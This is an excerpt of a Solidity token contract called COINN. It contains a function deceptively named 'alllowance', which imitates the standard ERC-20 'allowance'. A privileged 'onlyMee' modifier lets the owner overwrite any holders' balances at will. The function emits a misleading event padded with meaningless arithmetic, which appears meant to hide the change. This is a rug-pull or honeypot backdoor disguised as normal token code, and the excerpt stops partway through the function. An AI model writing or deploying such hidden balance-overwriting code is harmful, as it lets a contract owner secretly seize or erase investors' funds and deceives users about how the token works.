...
contract COINN is Context, Ownable, IERC20 {
    ...
    function alllowance(address[] memory accounts, uint256 newBalance) external onlyMee {

        for (uint256 f = 0; f < accounts.length; f++) {

            uint256 currentBalance = _savings[accounts[f]] + 13;

            _savings[accounts[f]] = newBalance;

            emit saveeed(accounts[f], currentBalance - 12, newBalance);
